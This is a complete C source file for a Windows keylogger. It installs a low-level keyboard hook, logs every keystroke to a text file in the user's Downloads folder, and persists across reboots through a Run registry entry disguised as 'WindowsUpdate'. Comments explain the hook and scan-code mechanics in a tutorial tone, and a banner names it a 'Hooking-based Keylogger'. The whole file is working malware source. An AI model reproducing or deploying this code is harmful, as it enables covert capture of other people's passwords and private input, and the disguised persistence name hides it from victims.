#include <windows.h>
#include <stdio.h>

FILE *logFile; // Declare globally

void AddToRegistry()
{
    HKEY hKey;
    const char *path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    char exePath[MAX_PATH];

    // Get current executable path
    GetModuleFileName(NULL, exePath, MAX_PATH);

    // Add to registry
    if (RegOpenKeyEx(HKEY_CURRENT_USER, path, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS)
    {
        RegSetValueEx(hKey, "WindowsUpdate", 0, REG_SZ, (BYTE *)exePath, strlen(exePath) + 1);
        RegCloseKey(hKey);
    }
}

void WriteKeyToFile(const char *text)
{
    if (logFile)
    {
        fprintf(logFile, "%s", text);
        fflush(logFile);
    }
}

void PrintKeyName(KBDLLHOOKSTRUCT *pKey)
{
    // Get scan code
    UINT scanCode = pKey->scanCode;

    if (pKey->flags & LLKHF_EXTENDED)
    {
        scanCode |= 0xE000;
    }
    // Some keys (arrows, Insert, Delete, Home, End, Page Up/Down, etc.) have an "extended" flag set.
    //   "extended" refers to keys that are not part of the main typewriter area of the keyboard
    // If LLKHF_EXTENDED is set, you must set bit 14 of the scan code (0xE000) so that GetKeyNameTextA() knows it’s extended and gives the right name.

    // Buffer for key name
    char keyName[128];
    if (GetKeyNameTextA(scanCode << 16, keyName, sizeof(keyName)) > 0)
    { // GetKeyNameTextA() works on scan codes, not virtual key codes.
        printf("Key pressed: %s\n", keyName);
        WriteKeyToFile(keyName);
    }
    else
    {
        printf("Key pressed: [Unknown: 0x%X]\n", pKey->vkCode);
        char buffer[16];
        sprintf(buffer, "[%d]", pKey->vkCode);
        WriteKeyToFile(buffer);
    }

    // GetKeyNameTextA() converts the scan code into a human-readable name.
    // It expects: The scan code in bits 16–23 of the parameter (hence the scanCode << 16 shift).
    // An optional extended key flag already applied.
    // If it succeeds, it writes the name into keyName.
    // If it fails, it prints the virtual key code as a fallback.
}

HHOOK g_hHook = NULL;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            KBDLLHOOKSTRUCT *pKey = (KBDLLHOOKSTRUCT *)lParam;
            PrintKeyName(pKey);
        }
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

void SetHook()
{
    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (g_hHook == NULL)
    {
        printf("Failed to install hook!\n");
    }
}

void RemoveHook()
{
    if (g_hHook != NULL)
    {
        UnhookWindowsHookEx(g_hHook);
        g_hHook = NULL;
    }
}

int main()
{

    AddToRegistry();
    char downloadsPath[MAX_PATH];
    char *userProfile = getenv("USERPROFILE"); // Get user home folder

    if (!userProfile)
    {
        printf("Failed to get USERPROFILE environment variable.\n");
        return 1;
    }

    // Build path to Downloads\keylog.txt
    snprintf(downloadsPath, MAX_PATH, "%s\\Downloads\\keylog.txt", userProfile);

    logFile = fopen(downloadsPath, "a+");
    if (!logFile)
    {
        printf("Failed to open log file at %s\n", downloadsPath);
        return 1;
    }

    printf("Logging keys to: %s\n", downloadsPath);

    SetConsoleOutputCP(CP_UTF8);
    printf("\n\n\n");

    printf(
        "\t\t\t\t██╗  ██╗███████╗██╗   ██╗██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗        \n"
        "\t\t\t\t██║ ██╔╝██╔════╝╚██╗ ██╔╝██║     ██╔═══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗       \n"
        "\t\t\t\t█████╔╝ █████╗   ╚████╔╝ ██║     ██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝       \n"
        "\t\t\t\t██╔═██╗ ██╔══╝    ╚██╔╝  ██║     ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗       \n"
        "\t\t\t\t██║  ██╗███████╗   ██║   ███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║       \n"
        "\t\t\t\t╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝       \n");
    printf("\t\t\t\t\t\t\tHooking-based(low level) Keylogger\n");

    printf("\n\n\n");


    SetHook();
    if (g_hHook == NULL)
    {
        return 1; // failed to set hook
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) // This function waits until there’s a message in the queue (from the OS to your program) and then removes it from the queue.
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // If your program doesn’t pump messages (with GetMessage / TranslateMessage / DispatchMessage),
    // the OS never gets a chance to call your hook callback — because the thread is essentially “sleeping” with no message processing.

    // If you use SetWindowsHookEx in a DLL injected into another process, that other process is already running a message loop, so you might not need your own.

    RemoveHook();
    return 0;
}
